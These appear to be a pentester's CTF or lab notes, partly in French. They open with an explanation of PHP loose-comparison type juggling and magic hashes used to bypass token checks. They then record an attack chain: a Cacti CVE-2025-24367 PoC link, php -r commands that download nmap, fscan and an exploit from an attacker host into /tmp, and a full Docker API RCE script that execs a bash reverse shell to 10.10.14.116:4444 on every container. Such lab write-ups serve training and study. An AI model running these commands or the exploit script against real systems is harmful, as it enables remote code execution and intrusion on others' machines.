![[IMG-20251209172404463.png]]
![[Pasted image 20251208190315.png]]

![[Pasted image 20251208190330.png]]

![[Pasted image 20251209004618.png]]

![[Pasted image 20251209004647.png]]

En PHP, l’utilisation de l’opérateur de comparaison lâche `==` peut entraîner des conversions automatiques de type (type juggling).  
Ces conversions peuvent provoquer des comportements inattendus, notamment lors de comparaisons entre chaînes de caractères et valeurs numériques.  
Dans un contexte d’authentification, ce mécanisme peut permettre un contournement de contrôle si l’application ne valide pas strictement les types.

## Magic Hashes

Certaines chaînes de caractères prenant la forme d’une notation scientifique, par exemple `0e1234`, sont interprétées par PHP comme des valeurs numériques.  
Lorsqu’une comparaison lâche est effectuée, PHP convertit ces chaînes en nombres flottants. Une chaîne commençant par `0e` suivie uniquement de chiffres est interprétée comme étant égale à 0.

Exemples de conversions implicites :  
`"0e1234" == "0e9999"` est évalué à VRAI car les deux chaînes sont interprétées comme la valeur numérique 0.  
`"0e1234" == 0` est évalué à VRAI pour la même raison.

Ces chaînes sont couramment appelées « Magic Hashes ».

## Exploitation en Cas de Comparaison Lâche

Si un code de vérification utilise une comparaison non stricte, par exemple :
```php
if ($stored_token == $_GET['token']) {
    // accès autorisé
}
```
alors toute valeur de type Magic Hash peut être acceptée comme équivalente à un token légitime si ce dernier est lui aussi convertible en valeur numérique.  
Cela peut conduire à un contournement complet d’un mécanisme d’authentification.

## Comparaison Stricte

L’opérateur strict `===` compare à la fois la valeur et le type des opérandes sans conversion automatique.  
Une chaîne comme `"0e1234"` n’est jamais considérée comme égale à un entier ou à une autre chaîne différente.  
Ainsi, `"0e1234" === "0e9999"` est évalué à FAUX, de même que `"0e1234" === 0`.

Le recours systématique à `===` pour les vérifications de tokens, hachages, identifiants uniques et données sensibles élimine ce type de vulnérabilité.


![[Pasted image 20251208211242.png]]

![[Pasted image 20251209004733.png]]
![[Pasted image 20251209004742.png]]
[CVE-2025-24367](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
![[Pasted image 20251209003245.png]]

![[Pasted image 20251209003253.png]]

![[Pasted image 20251209004847.png]]

![[Pasted image 20251209120245.png]]


![[Pasted image 20251209120607.png]]
192.168.65.7
https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap                                 
php -r "copy('http://10.10.14.116:8080/nmap.1', '/tmp/nmap');"
php -r "copy('http://10.10.14.116:8000/fscan.1', '/tmp/fscan');"

![[Pasted image 20251209174319.png]]
wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
![[Pasted image 20251209180701.png]]

php -r "copy('http://10.10.14.116:8000/exploit', '/tmp/poc');"

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py

```python
from __future__ import print_function
import requests
import logging
import json
import urllib.parse

# NOTE
# Enable Remote API with the following command
# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
# This is an intended feature, remember to filter the port 2375..

name          = "docker"
description   = "Docker RCE via Open Docker API on port 2375"
author        = "Swissky"

# Step 1 - Extract id and name from each container
ip   = "192.168.65.7"
port = "2375"
data = "containers/json"
url  = "http://{}:{}/{}".format(ip, port, data)
r = requests.get(url)

if r.json:
    for container in r.json():
        container_id   = container['Id']
        container_name = container['Names'][0].replace('/','')
        print((container_id, container_name))

        # Step 2 - Prepare command
        cmd = ' ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.116/4444 0>&1"]'


        data = "containers/{}/exec".format(container_name)
        url = "http://{}:{}/{}".format(ip, port, data)
        post_json = '{ "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":'+cmd+' }'
        post_header = {
            "Content-Type": "application/json"
        }
        r = requests.post(url, json=json.loads(post_json))


        # Step 3 - Execute command
        id_cmd = r.json()['Id']
        data = "exec/{}/start".format(id_cmd)
        url = "http://{}:{}/{}".format(ip, port, data)
        post_json = '{ "Detach":false,"Tty":false}'
        post_header = {
            "Content-Type": "application/json"
        }
        r = requests.post(url, json=json.loads(post_json))
        print(r)
```

curl -s http://192.168.65.7:2375/images/json

php -r "copy('http://10.10.14.116:8000/create_container.json', '/tmp/create_container.json');"